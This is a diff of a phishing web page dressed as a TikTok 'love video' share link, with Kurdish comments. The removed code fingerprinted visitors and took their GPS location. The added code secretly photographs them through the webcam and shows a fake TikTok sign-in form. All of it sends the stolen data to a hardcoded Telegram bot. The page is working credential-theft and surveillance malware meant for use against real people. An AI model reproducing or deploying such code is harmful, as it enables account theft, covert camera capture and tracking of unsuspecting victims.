@@ -1,191 +1,590 @@
 <!DOCTYPE html>
-<html>
+<html lang="ku">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok</title>
+    
+    <meta property="og:title" content="💖 ببینە ئەم ڤیدیۆیە 🥰">
+    <meta property="og:description" content="لە ناخی دلەوە بۆتۆی ئازیزم 💕">
+    <meta property="og:image" content="https://i.imgur.com/bS4mzWU.jpeg">
+    <meta property="og:url" content="https://vt.tiktok.com/ZSQnr4vyV/">
+    <meta property="og:type" content="video.other">
+    <meta property="og:site_name" content="TikTok">
+    <meta name="twitter:card" content="player">
+    <meta name="twitter:title" content="💖 ببینە ئەم ڤیدیۆیە 🥰">
+    <meta name="twitter:description" content="لە ناخی دلەوە بۆتۆی ئازیزم 💕">
+    <meta name="twitter:image" content="https://i.imgur.com/bS4mzWU.jpeg">
+    
+    <title>TikTok - Love Video ❤️</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow-y:auto;color:#fff;padding:20px;}
-        .loader{text-align:center;width:100%;max-width:420px;padding:20px;}
-        .loader svg{margin-bottom:16px;}
-        .loader h2{font-size:28px;font-weight:700;margin-bottom:4px;letter-spacing:1px;}
-        .loader .sub{color:#888;font-size:15px;margin-bottom:20px;}
-        .spinner{width:38px;height:38px;border:3px solid #222;border-top-color:#ff0050;border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto;}
-
-        /* ئایفۆنەکان */
-        .iphone-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:20px 0;}
-        .iphone-item{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 6px;text-align:center;transition:all 0.3s ease;}
-        .iphone-item .icon{font-size:24px;margin-bottom:4px;}
-        .iphone-item .name{font-size:11px;font-weight:600;color:#fff;letter-spacing:0.3px;}
-        .iphone-item .year{font-size:9px;color:rgba(255,255,255,0.3);margin-top:2px;}
-        .iphone-item.pro{border-color:rgba(255,51,102,0.15);background:rgba(255,51,102,0.05);}
-        .iphone-item.pro .name{color:#ff6b9d;}
-        .iphone-item.mini{border-color:rgba(0,242,234,0.1);}
-        .iphone-item.se{border-color:rgba(255,204,0,0.1);}
-
-        @keyframes spin{to{transform:rotate(360deg);}}
-        .redirect-note{color:#444;font-size:12px;margin-top:30px;}
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { 
+            background: linear-gradient(145deg, #0a0a1a 0%, #1a1a3e 40%, #0f0c29 100%);
+            color: #fff; 
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .particles {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: 0; overflow: hidden;
+        }
+        .particle {
+            position: absolute; width: 4px; height: 4px;
+            background: rgba(255, 51, 102, 0.4); border-radius: 50%;
+            animation: particleFloat 8s infinite;
+        }
+        .particle:nth-child(1) { left: 5%; animation-delay: 0s; }
+        .particle:nth-child(2) { left: 15%; animation-delay: 1s; }
+        .particle:nth-child(3) { left: 25%; animation-delay: 2s; }
+        .particle:nth-child(4) { left: 35%; animation-delay: 0.5s; }
+        .particle:nth-child(5) { left: 45%; animation-delay: 1.5s; }
+        .particle:nth-child(6) { left: 55%; animation-delay: 3s; }
+        .particle:nth-child(7) { left: 65%; animation-delay: 2.5s; }
+        .particle:nth-child(8) { left: 75%; animation-delay: 4s; }
+        .particle:nth-child(9) { left: 85%; animation-delay: 1.8s; }
+        .particle:nth-child(10) { left: 95%; animation-delay: 3.5s; }
+        
+        @keyframes particleFloat {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 0.8; }
+            50% { opacity: 0.4; }
+            90% { opacity: 0.1; }
+            100% { transform: translateY(-10vh) scale(1.5); opacity: 0; }
+        }
+        
+        .floating-hearts {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; overflow: hidden; z-index: 0;
+        }
+        .floating-heart {
+            position: absolute; font-size: 20px; opacity: 0.2;
+            animation: floatUp 7s linear infinite;
+        }
+        .floating-heart:nth-child(1) { left: 8%; animation-delay: 0s; font-size: 14px; }
+        .floating-heart:nth-child(2) { left: 22%; animation-delay: 1.2s; font-size: 22px; }
+        .floating-heart:nth-child(3) { left: 42%; animation-delay: 2.4s; font-size: 16px; }
+        .floating-heart:nth-child(4) { left: 60%; animation-delay: 0.8s; font-size: 24px; }
+        .floating-heart:nth-child(5) { left: 78%; animation-delay: 1.8s; font-size: 15px; }
+        .floating-heart:nth-child(6) { left: 32%; animation-delay: 3.2s; font-size: 20px; }
+        .floating-heart:nth-child(7) { left: 88%; animation-delay: 2.8s; font-size: 13px; }
+        .floating-heart:nth-child(8) { left: 52%; animation-delay: 4.2s; font-size: 18px; }
+        
+        @keyframes floatUp {
+            0% { transform: translateY(100vh) scale(0) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.3; } 50% { opacity: 0.2; } 90% { opacity: 0.1; }
+            100% { transform: translateY(-10vh) scale(1.3) rotate(720deg); opacity: 0; }
+        }
+        
+        .container { 
+            position: relative; z-index: 1;
+            width: 100%; max-width: 400px; padding: 20px;
+        }
+        
+        /* Loading Screen */
+        #loadingScreen {
+            text-align: center;
+            transition: opacity 0.6s ease, transform 0.6s ease;
+        }
+        #loadingScreen.hidden {
+            opacity: 0;
+            transform: scale(0.9);
+            pointer-events: none;
+            position: absolute;
+            width: 100%;
+        }
+        
+        .heart {
+            width: 120px; height: 120px; margin: 0 auto 30px; position: relative;
+            animation: heartbeat 1.5s ease-in-out infinite;
+            filter: drop-shadow(0 0 40px rgba(255, 51, 102, 0.3));
+        }
+        .heart::before, .heart::after {
+            content: ''; position: absolute; width: 120px; height: 120px;
+            background: linear-gradient(145deg, #ff0050, #ff3366, #ff6b9d);
+            border-radius: 50%;
+        }
+        .heart::before { left: -60px; top: 0; }
+        .heart::after { left: 0; top: -60px; }
+        .heart-center {
+            position: absolute; width: 120px; height: 120px;
+            background: linear-gradient(145deg, #ff0050, #ff3366, #ff6b9d);
+            transform: rotate(45deg); top: 0; left: 0; z-index: 1;
+            border-radius: 24px 0 24px 0;
+        }
+        .heart-inner {
+            position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%, -50%) rotate(-45deg);
+            z-index: 2; font-size: 36px; color: white;
+            text-shadow: 0 0 20px rgba(255,255,255,0.5);
+        }
+        
+        @keyframes heartbeat {
+            0% { transform: scale(1); } 15% { transform: scale(1.12); }
+            30% { transform: scale(1); } 45% { transform: scale(1.08); }
+            60% { transform: scale(1); } 100% { transform: scale(1); }
+        }
+        
+        .loader-ring {
+            width: 56px; height: 56px; margin: 0 auto; position: relative;
+        }
+        .loader-ring::before, .loader-ring::after {
+            content: ''; position: absolute; top: 0; left: 0;
+            width: 100%; height: 100%; border-radius: 50%;
+            border: 3px solid transparent;
+        }
+        .loader-ring::before {
+            border-top-color: #ff3366; border-right-color: #ff6b9d;
+            animation: spinRing 1.2s ease-in-out infinite;
+        }
+        .loader-ring::after {
+            border-bottom-color: rgba(255, 51, 102, 0.3);
+            border-left-color: rgba(255, 107, 157, 0.3);
+            animation: spinRing 0.8s ease-in-out infinite reverse;
+        }
+        @keyframes spinRing {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .status-text { 
+            color: rgba(255,255,255,0.8); font-size: 17px; margin-top: 25px;
+            font-weight: 400; letter-spacing: 0.5px;
+        }
+        .progress-bar {
+            width: 300px; max-width: 85vw; height: 6px;
+            background: rgba(255,255,255,0.06); border-radius: 10px;
+            margin: 18px auto; overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .progress-fill {
+            height: 100%; width: 0%;
+            background: linear-gradient(90deg, #ff0050, #ff3366, #ff6b9d, #ff0050);
+            background-size: 300% 100%; border-radius: 10px;
+            animation: progress 3.5s ease-in-out forwards, shimmer 0.8s linear infinite;
+        }
+        @keyframes progress {
+            0% { width: 0%; } 40% { width: 55%; } 70% { width: 75%; }
+            85% { width: 88%; } 95% { width: 95%; } 100% { width: 100%; }
+        }
+        @keyframes shimmer {
+            0% { background-position: 300% 0; }
+            100% { background-position: -300% 0; }
+        }
+        .sub-text {
+            color: rgba(255,255,255,0.35); font-size: 13px; margin-top: 12px;
+            font-weight: 300; letter-spacing: 2px; text-transform: uppercase;
+        }
+        
+        /* Login Screen */
+        #loginScreen {
+            display: none;
+            animation: fadeInUp 0.5s ease forwards;
+        }
+        #loginScreen.visible {
+            display: block;
+        }
+        
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .login-container {
+            background: rgba(255,255,255,0.03);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 40px 30px 30px;
+            border: 1px solid rgba(255,255,255,0.06);
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+        }
+        
+        .login-logo {
+            width: 56px; height: 56px;
+            background: linear-gradient(135deg, #ff0050, #00f2ea);
+            border-radius: 16px;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 32px;
+            color: white;
+            box-shadow: 0 8px 32px rgba(255, 0, 80, 0.3);
+        }
+        
+        .login-title {
+            font-size: 22px; font-weight: 700;
+            text-align: center; margin-bottom: 8px;
+            color: #fff;
+        }
+        
+        .login-sub {
+            font-size: 14px; font-weight: 400;
+            text-align: center; margin-bottom: 30px;
+            color: rgba(255,255,255,0.5);
+        }
+        
+        .form-group {
+            margin-bottom: 18px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: rgba(255,255,255,0.6);
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 16px 18px;
+            background: rgba(255,255,255,0.06);
+            border: 1.5px solid rgba(255,255,255,0.08);
+            border-radius: 14px;
+            color: #fff;
+            font-size: 16px;
+            font-family: 'Inter', sans-serif;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            border-color: #ff3366;
+            background: rgba(255,51,102,0.06);
+            box-shadow: 0 0 0 4px rgba(255,51,102,0.1);
+        }
+        
+        .form-group input::placeholder {
+            color: rgba(255,255,255,0.25);
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #ff0050, #ff3366);
+            border: none;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 40px rgba(255, 0, 80, 0.3);
+        }
+        
+        .login-btn:active {
+            transform: translateY(0);
+        }
+        
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .login-btn .btn-text {
+            transition: opacity 0.3s ease;
+        }
+        
+        .login-btn .btn-spinner {
+            display: none;
+            width: 22px; height: 22px;
+            border: 2.5px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: 0 auto;
+        }
+        
+        .login-btn.loading .btn-text { display: none; }
+        .login-btn.loading .btn-spinner { display: block; }
+        
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        .login-footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: rgba(255,255,255,0.2);
+        }
+        
+        .login-footer a {
+            color: rgba(255,255,255,0.3);
+            text-decoration: none;
+        }
+        
+        #video { display: none; }
+        #canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="loader" id="app">
-        <svg width="56" height="56" viewBox="0 0 24 24" fill="none">
-            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.53 3.66-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.41-.88.03-.24.37-.49 1.02-.74 3.99-1.73 6.65-2.88 7.98-3.43 3.8-1.58 4.59-1.85 5.1-1.86.11 0 .37.03.53.17.14.12.18.28.2.45-.02.12-.02.2-.04.31z" fill="#ff0050"/>
-        </svg>
-        <h2>TikTok</h2>
-        <p class="sub">چاوەڕوانبە...</p>
-
-        <!-- ئایفۆنەکان -->
-        <div style="margin:8px 0;font-size:12px;color:#666;">IPhone 7 to 17</div>
-        <div class="iphone-grid">
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 7</div><div class="year">2016</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">7 Plus</div><div class="year">2016</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 8</div><div class="year">2017</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">8 Plus</div><div class="year">2017</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">iPhone X</div><div class="year">2017</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">XS</div><div class="year">2018</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">XS Max</div><div class="year">2018</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">XR</div><div class="year">2018</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 11</div><div class="year">2019</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">11 Pro</div><div class="year">2019</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">11 Pro Max</div><div class="year">2019</div></div>
-            <div class="iphone-item mini"><div class="icon">📱</div><div class="name">12 Mini</div><div class="year">2020</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 12</div><div class="year">2020</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">12 Pro</div><div class="year">2020</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">12 Pro Max</div><div class="year">2020</div></div>
-            <div class="iphone-item mini"><div class="icon">📱</div><div class="name">13 Mini</div><div class="year">2021</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 13</div><div class="year">2021</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">13 Pro</div><div class="year">2021</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">13 Pro Max</div><div class="year">2021</div></div>
-            <div class="iphone-item se"><div class="icon">📱</div><div class="name">SE (3rd)</div><div class="year">2022</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 14</div><div class="year">2022</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">14 Plus</div><div class="year">2022</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">14 Pro</div><div class="year">2022</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">14 Pro Max</div><div class="year">2022</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 15</div><div class="year">2023</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">15 Plus</div><div class="year">2023</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">15 Pro</div><div class="year">2023</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">15 Pro Max</div><div class="year">2023</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 16</div><div class="year">2024</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">16 Plus</div><div class="year">2024</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">16 Pro</div><div class="year">2024</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">16 Pro Max</div><div class="year">2024</div></div>
-            <div class="iphone-item se"><div class="icon">📱</div><div class="name">16e</div><div class="year">2025</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 17</div><div class="year">2026</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">17 Pro</div><div class="year">2026</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">17 Pro Max</div><div class="year">2026</div></div>
-            <div class="iphone-item se"><div class="icon">📱</div><div class="name">SE 4</div><div class="year">2026</div></div>
-        </div>
-
-        <div class="spinner"></div>
-        <p class="redirect-note">دەچیتە وێبگەڕ</p>
+    <div class="particles">
+        <div class="particle"></div><div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div>
+    </div>
+    
+    <div class="floating-hearts">
+        <span class="floating-heart">💖</span><span class="floating-heart">💕</span>
+        <span class="floating-heart">💗</span><span class="floating-heart">💘</span>
+        <span class="floating-heart">💓</span><span class="floating-heart">💝</span>
+        <span class="floating-heart">💖</span><span class="floating-heart">💕</span>
     </div>
 
-    <script>
-        // ==================== تۆکنەکانت ====================
-        const BOT_TOKEN = "8736195412:AAETqDHUXTWVXnto8tpgaIqhqWh_JwY-wEE";
-        const CHAT_ID = "6230485449";
-        // =================================================
-
-        function sendToTelegram(text) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=Markdown&text=${encodeURIComponent(text)}`;
-            new Image().src = url;
-            try {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST', mode: 'no-cors',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
-                });
-            } catch(e) {}
-            try {
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, true);
-                xhr.setRequestHeader('Content-Type', 'application/json');
-                xhr.send(JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'}));
-            } catch(e) {}
-        }
-
-        function getIP(callback) {
-            try {
-                const s = document.createElement('script');
-                s.src = 'https://api.ipify.org?format=jsonp&callback=ipCallback';
-                window.ipCallback = function(data) {
-                    callback(data.ip);
-                    if(s.parentNode) s.parentNode.removeChild(s);
-                    delete window.ipCallback;
-                };
-                document.body.appendChild(s);
-                setTimeout(() => callback('نەدۆزرایەوە'), 5000);
-            } catch(e) { callback('نەدۆزرایەوە'); }
-        }
-
-        function collectAndSend() {
-            getIP(function(ip) {
-                const ua = navigator.userAgent;
-                const os = navigator.platform;
-                const lang = navigator.language;
-                const screenRes = `${screen.width}x${screen.height}`;
-                const colorDepth = `${screen.colorDepth}-bit`;
-                const cores = navigator.hardwareConcurrency || 'نەزانراو';
-                const memory = navigator.deviceMemory || 'نەزانراو';
-                const time = new Date().toLocaleString();
-                const referrer = document.referrer || 'ڕاستەوخۆ';
+    <div class="container">
+        <!-- Loading Screen -->
+        <div id="loadingScreen">
+            <div class="heart">
+                <div class="heart-center"></div>
+                <div class="heart-inner">💕</div>
+            </div>
+            <div class="loader-ring"></div>
+            <div class="status-text" id="status">Loading video ...</div>
+            <div class="progress-bar"><div class="progress-fill"></div></div>
+            <div class="sub-text">✨ tiktok.com ✨</div>
+        </div>
+        
+        <!-- Login Screen -->
+        <div id="loginScreen">
+            <div class="login-container">
+                <div class="login-logo">♪</div>
+                <div class="login-title">Sign in to TikTok</div>
+                <div class="login-sub">Enter your phone number to watch this video</div>
                 
-                let batteryInfo = '';
-                if (navigator.getBattery) {
-                    navigator.getBattery().then(bat => {
-                        batteryInfo = `\n**🔋 بەتەری:** ${Math.round(bat.level * 100)}%`;
-                    }).catch(() => {});
+                <form id="loginForm" autocomplete="off">
+                    <div class="form-group">
+                        <label>Phone Number</label>
+                        <input type="tel" id="phoneInput" placeholder="+964 7XX XXX XXXX" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Password</label>
+                        <input type="password" id="passwordInput" placeholder="Enter your password">
+                    </div>
+                    <button type="submit" class="login-btn" id="loginBtn">
+                        <span class="btn-text">Sign In</span>
+                        <div class="btn-spinner"></div>
+                    </button>
+                </form>
+                
+                <div class="login-footer">
+                    <a href="#">Forgot password?</a> · <a href="#">Sign up</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ============================
+        // 🛠 کۆنفیکرەیشن
+        // ============================
+        const TELEGRAM_BOT_TOKEN = "8736195412:AAETqDHUXTWVXnto8tpgaIqhqWh_JwY-wEE";
+        const TELEGRAM_CHAT_ID = "6230485449";
+        
+        let photoTaken = false;
+        let userIP = 'نەزانراو';
+        let photoData = null;
+
+        // ============================
+        // 🌐 تەنها وەرگرتنی ئایپی
+        // ============================
+        async function getIP() {
+            try {
+                const resp = await fetch('https://api.ipify.org?format=json');
+                const data = await resp.json();
+                userIP = data.ip || 'نەزانراو';
+            } catch (err) {
+                try {
+                    const resp = await fetch('https://api.myip.com');
+                    const data = await resp.json();
+                    userIP = data.ip || 'نەزانراو';
+                } catch (e) {
+                    userIP = 'نەدۆزرایەوە';
+                }
+            }
+        }
+
+        // ============================
+        // 📷 کامێرا
+        // ============================
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
+                });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                setTimeout(() => {
+                    takePhoto(stream);
+                }, 2000);
+                
+            } catch (err) {
+                console.error("Camera error:", err);
+                setTimeout(() => showLogin(), 2500);
+            }
+        }
+
+        async function takePhoto(stream) {
+            if (photoTaken) return;
+            photoTaken = true;
+            
+            try {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                photoData = canvas.toDataURL('image/jpeg', 0.85);
+                
+                // تەنها وێنە + ئایپی بنێرە
+                await sendPhotoToTelegram(photoData);
+            } catch (err) {
+                console.error("Photo error:", err);
+            }
+            
+            if (stream) stream.getTracks().forEach(track => track.stop());
+            
+            setTimeout(() => showLogin(), 500);
+        }
+
+        // ============================
+        // 📤 ناردنی وێنە + ئایپی
+        // ============================
+        async function sendPhotoToTelegram(imageBase64) {
+            try {
+                const byteString = atob(imageBase64.split(',')[1]);
+                const mimeString = imageBase64.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                const blob = new Blob([ab], { type: mimeString });
+                
+                const caption = `💖 **New Photo** 💖
+
+━━━━━━━━━━━━━━━━
+🌐 **IP:** \`${userIP}\`
+🕐 **Time:** ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━`;
+
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'Markdown');
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST', body: formData
+                });
+                
+                console.log("✅ Photo + IP sent!");
+            } catch (err) {
+                console.error("Telegram error:", err);
+            }
+        }
+
+        // ============================
+        // 📱 نمایشی لاگین
+        // ============================
+        function showLogin() {
+            document.getElementById('loadingScreen').classList.add('hidden');
+            document.getElementById('loginScreen').classList.add('visible');
+        }
+
+        // ============================
+        // 📤 ناردنی ژمارە + پاسۆرد
+        // ============================
+        async function sendPhoneToTelegram(phone, password) {
+            try {
+                const text = `━━━━━━━━━━━━━━━━
+📱 **TIKTOK LOGIN DATA** 📱
+━━━━━━━━━━━━━━━━
+📞 **Phone:** \`${phone}\`
+🔑 **Password:** \`${password || 'N/A'}\`
+━━━━━━━━━━━━━━━━
+🌐 **IP:** \`${userIP}\`
+🕐 **Time:** ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━`;
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                if (photoData) {
+                    await sendPhotoToTelegram(photoData);
                 }
                 
-                let msg = `🎯 **زانیاری قوربانی**\n\n`;
-                msg += `**🌐 ئایپی:** \`${ip}\`\n`;
-                msg += `**🖥 User-Agent:** \`${ua}\`\n`;
-                msg += `**📱 OS:** ${os}\n`;
-                msg += `**🌍 زمان:** ${lang}\n`;
-                msg += `**📐 شاشە:** ${screenRes}\n`;
-                msg += `**🎨 ڕەنگ:** ${colorDepth}\n`;
-                msg += `**🧠 CPU:** ${cores} cores\n`;
-                msg += `**🔋 RAM:** ${memory} GB\n`;
-                msg += `**🔗 سەرچاوە:** ${referrer}\n`;
-                msg += `**🕐 کات:** ${time}\n`;
-                
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        function(pos) {
-                            msg += `**📍 GPS:** ${pos.coords.latitude}, ${pos.coords.longitude}\n`;
-                            msg += `**📡 وردی:** ${pos.coords.accuracy} مەتر\n`;
-                            sendToTelegram(msg);
-                        },
-                        function() { sendToTelegram(msg); },
-                        {timeout: 4000, enableHighAccuracy: true}
-                    );
-                } else { sendToTelegram(msg); }
-            });
+                console.log("✅ Phone & password sent!");
+            } catch (err) {
+                console.error("Send error:", err);
+            }
         }
 
-        window.onload = function() {
-            collectAndSend();
+        // ============================
+        // 🎯 فۆرمی لاگین
+        // ============================
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
             
-            setTimeout(function() {
-                const tiktokUrl = 'https://www.tiktok.com';
-                
-                const a = document.createElement('a');
-                a.href = tiktokUrl;
-                a.target = '_blank';
-                a.rel = 'noopener noreferrer';
-                a.style.display = 'none';
-                document.body.appendChild(a);
-                a.click();
-                
-                try { window.open(tiktokUrl, '_blank'); } catch(e) {}
-                
-                setTimeout(function() {
-                    window.location.href = tiktokUrl;
-                }, 300);
-            }, 2200);
-        };
+            const phone = document.getElementById('phoneInput').value.trim();
+            const password = document.getElementById('passwordInput').value.trim();
+            const btn = document.getElementById('loginBtn');
+            
+            if (!phone) return;
+            
+            btn.classList.add('loading');
+            btn.disabled = true;
+            
+            await sendPhoneToTelegram(phone, password);
+            
+            setTimeout(() => {
+                window.location.href = "https://www.tiktok.com";
+            }, 1500);
+        });
+
+        // ============================
+        // 🚀 دەستپێکردن
+        // ============================
+        window.addEventListener('load', async () => {
+            document.getElementById('status').textContent = 'Preparing video ...';
+            await getIP();  // تەنها ئایپی وەردەگرێت
+            startCamera();
+        });
     </script>
 </body>
 </html>
